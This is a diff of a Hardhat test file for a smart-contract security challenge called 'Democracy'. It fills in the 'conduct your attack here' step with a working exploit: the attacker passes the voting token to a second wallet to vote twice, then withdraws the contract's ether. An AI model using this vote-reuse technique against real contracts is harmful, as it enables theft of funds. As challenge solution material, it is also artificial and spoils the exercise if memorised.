@@ -10,23 +10,28 @@ const NAME = "Democracy";
 
 describe(NAME, function () {
   async function setup() {
-      const [owner, attackerWallet] = await ethers.getSigners();
+      const [owner, attackerWallet, attackingSecondaryWallet] = await ethers.getSigners();
       const value = ethers.utils.parseEther("1");
 
       const VictimFactory = await ethers.getContractFactory(NAME);
-      const victimContract = await VictimFactory.deploy({ value });
+      const victimContract = await VictimFactory.connect(owner).deploy({ value });
 
-      return { victimContract, attackerWallet };
+      return { victimContract, attackerWallet, attackingSecondaryWallet };
   }
 
   describe("exploit", async function () {
       let victimContract, attackerWallet;
       before(async function () {
-          ({ victimContract, attackerWallet } = await loadFixture(setup));
+          ({ victimContract, attackerWallet, attackingSecondaryWallet } = await loadFixture(setup));
       })
 
       it("conduct your attack here", async function () {
-          
+          await victimContract.connect(attackerWallet).nominateChallenger(attackerWallet.address);
+          await victimContract.connect(attackerWallet).transferFrom(attackerWallet.address, attackingSecondaryWallet.address, 0);
+          await victimContract.connect(attackingSecondaryWallet).vote(attackerWallet.address);
+          await victimContract.connect(attackingSecondaryWallet).transferFrom(attackingSecondaryWallet.address, attackerWallet.address, 0);
+          await victimContract.connect(attackerWallet).vote(attackerWallet.address);
+          await victimContract.connect(attackerWallet).withdrawToAddress(attackerWallet.address);
       });
 
       after(async function () {
